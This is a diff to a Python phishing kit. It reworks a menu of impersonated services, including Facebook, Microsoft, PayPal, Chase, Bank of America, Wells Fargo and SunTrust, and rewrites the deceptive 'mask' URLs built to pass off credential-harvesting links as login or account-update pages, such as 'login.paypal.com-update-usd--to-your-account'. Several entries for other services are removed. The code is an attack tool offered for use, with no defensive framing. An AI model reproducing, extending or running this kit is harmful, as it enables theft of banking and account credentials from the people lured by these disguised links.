@@ -99,15 +99,15 @@ logo='''
 # Website chooser
 def options():
     print()
-    print(green+'['+white+'01'+green+']'+yellow+' Facebook                '+green+'['+white+'23'+green+']'+yellow+' Chase            '+green+'['+white+'99'+green+']'+yellow+' About')
-    print(green+'['+white+'02'+green+']'+yellow+' Microsoft               '+green+'['+white+'45'+green+']'+yellow+' Bofa             '+green+'['+white+'00'+green+']'+yellow+' Exit')
-    print(green+'['+white+'03'+green+']'+yellow+' Outlook                 '+green+'['+white+'46'+green+']'+yellow+' Wells            '+green+'['+white+' m'+green+']'+yellow+' More tools')
-    print(green+'['+white+'04'+green+']'+yellow+' Yahoo                   '+green+'['+white+'46'+green+']'+yellow+' Suntrust')
+    print(green+'['+white+'01'+green+']'+yellow+' Facebook                '+green+'['+white+'13'+green+']'+yellow+' Chase            '+green+'['+white+'99'+green+']'+yellow+' About')
+    print(green+'['+white+'02'+green+']'+yellow+' Microsoft               '+green+'['+white+'14'+green+']'+yellow+' Bofa             '+green+'['+white+'00'+green+']'+yellow+' Exit')
+    print(green+'['+white+'03'+green+']'+yellow+' Outlook                 '+green+'['+white+'15'+green+']'+yellow+' Wells            '+green+'['+white+' m'+green+']'+yellow+' More tools')
+    print(green+'['+white+'04'+green+']'+yellow+' Yahoo                   '+green+'['+white+'16'+green+']'+yellow+' Suntrust')
     print(green+'['+white+'05'+green+']'+yellow+' Adobe')
     print(green+'['+white+'06'+green+']'+yellow+' Gmail')
-    print(green+'['+white+'14'+green+']'+yellow+' Paypal                  '+green+'['+white+'44'+green+']'+yellow+' DropBox')
-    print(green+'['+white+'41'+green+']'+yellow+' eBay                    '+green+'['+white+'46'+green+']'+yellow+' WordPress')
-    print(green+'['+white+'22'+green+']'+yellow+' LinkedIn                '+green+'['+white+'46'+green+']'+yellow+' Webmail')
+    print(green+'['+white+'07'+green+']'+yellow+' Paypal                  '+green+'['+white+'10'+green+']'+yellow+' DropBox')
+    print(green+'['+white+'08'+green+']'+yellow+' eBay                    '+green+'['+white+'11'+green+']'+yellow+' WordPress')
+    print(green+'['+white+'09'+green+']'+yellow+' LinkedIn                '+green+'['+white+'12'+green+']'+yellow+' Webmail')
     print()
     print()
     print()
@@ -342,13 +342,13 @@ def main():
         slowprint(logo)
         options()
         choose= input(ask+"Select one of the options > "+nc)
-        if choose=="1" or choose == "01":
+        if choose == "1" or choose == "01":
             folder="facebook"
-            mask="https://blue-verified-facebook-free"
+            mask="https://verified-facebook-account-login-server"
             requirements(folder,mask)
         elif choose == "2" or choose == "02":
             folder="microsoft"
-            mask='https://get-microsoft.com-update-login-free'
+            mask='https://get-microsoft.com-update-login-server'
             requirements(folder,mask)
         elif choose == "3" or choose == "03":
             folder="outlook"
@@ -366,96 +366,52 @@ def main():
             folder="gmail"
             mask='https://upgrade-your-gmail-plan-free'
             requirements(folder,mask)
-        elif choose == "14":
+        elif choose == "7" or choose == "07":
             folder="paypal"
-            mask='https://get-500-usd-free-to-your-account'
+            mask='https://login.paypal.com-update-usd--to-your-account'
+            requirements(folder,mask)
+        elif choose == "8" or choose == "08":
+            folder="ebay"
+            mask='https://ebay.com-account-notification-gift-card-free'
+            requirements(folder,mask)
+        elif choose == "9" or choose == "09":
+            folder="linkedin"
+            mask='https://login.linkedin.com-blue-badge-on-linkedin-account'
+            requirements(folder,mask)
+        elif choose == "10":
+            folder="dropbox"
+            mask='https://dropbox-information-user-storage-login'
+            requirements(folder,mask)
+        elif choose == "11":
+            folder="wordpress"
+            mask='https://wordpress-login-information-updated'
+            requirements(folder,mask)
+        elif choose == "12":
+            folder="webmail"
+            mask='https://webmail-login-information-updated'
+            requirements(folder,mask)
+        elif choose == "13":
+            folder="chase"
+            mask='https://get-a-premium-chase-account-update-login'
+            requirements(folder,mask)
+        elif choose == "14":
+            folder="bofa"
+            mask='https://view-bafo-account-login-update'
             requirements(folder,mask)
         elif choose == "15":
-            folder="steam"
-            mask='https://steam-500-usd-gift-card-free'
+            folder="wells"
+            mask='https://get-a-premium-wellsfago.com-for-unlimited-update'
             requirements(folder,mask)
         elif choose == "16":
-            folder="twitter"
-            mask='https://get-blue-badge-on-twitter-free'
-            requirements(folder,mask)
-        elif choose == "17":
-            folder="playstation"
-            mask='https://playstation-500-usd-gift-card-free'
-            requirements(folder,mask)
-        elif choose == "18":
-            folder="tiktok"
-            mask='https://tiktok-free-liker'
-            requirements(folder,mask)
-        elif choose == "19":
-            folder="twitch"
-            mask='https://unlimited-twitch-tv-user-for-free'
-            requirements(folder,mask)
-        elif choose == "20":
-            folder="pinterest"
-            mask='https://get-a-premium-plan-for-pinterest-free'
-            requirements(folder,mask)
-        elif choose == "21":
-            folder="snapchat"
-            mask='https://view-locked-snapchat-accounts-secretly'
-            requirements(folder,mask)
-        elif choose == "22":
-            folder="linkedin"
-            mask='https://get-a-premium-plan-for-linkedin-free'
-            requirements(folder,mask)
-        elif choose == "23":
-            folder="ebay"
-            mask='https://get-500-usd-free-to-your-account'
-            requirements(folder,mask)
-        elif choose == "24":
-            folder="quora"
-            mask='https://quora-premium-for-free'
-            requirements(folder,mask)
-        elif choose == "25":
-            folder="protonmail"
-            mask='https://protonmail-pro-basics-for-free'
-            requirements(folder,mask)
-        elif choose == "26":
-            folder="spotify"
-            mask='https://convert-your-account-to-spotify-premium'
-            requirements(folder,mask)
-        elif choose == "27":
-            folder="reddit"
-            mask='https://reddit-official-verified-member-badge'
-            requirements(folder,mask)
-        elif choose == "28":
-            folder="adobe"
-            mask='https://get-adobe-lifetime-pro-membership-free'
-            requirements(folder,mask)
-        elif choose == "29":
-            folder="deviantart"
-            mask='https://get-500-usd-free-to-your-acount'
-            requirements(folder,mask)
-        elif choose == "30":
-            folder="badoo"
-            mask='https://get-500-usd-free-to-your-acount'
-            requirements(folder,mask)
-        elif choose == "31":
-            folder="clashofclans"
-            mask='https://get-unlimited-gems-in-your-coc-account'
-            requirements(folder,mask)
-        elif choose == "32":
-            folder="ajio"
-            mask='https://get-limited-time-discount'
-            requirements(folder,mask)
-        elif choose == "33":
-            folder="jiorouter"
-            mask='https://get-premium-membership-free'
-            requirements(folder,mask)
-        elif choose == "34":
-            folder="freefire"
-            mask='https://get-unlimited-diamonds-in-your-ff-account'
+            folder="suntrust"
+            mask='https://get-suntrust.com-usd-account-update-login'
             requirements(folder,mask)
         elif choose == "99":
             about()
         elif choose == "m" or choose == "M":
             system("xdg-open 'https://github.com/lhost25/lhost25'")
             main()
-        elif choose=="00":
+        elif choose == "0" or choose == "00":
             exit(0)
         else:
             sprint("\n"+error+"Wrong input")
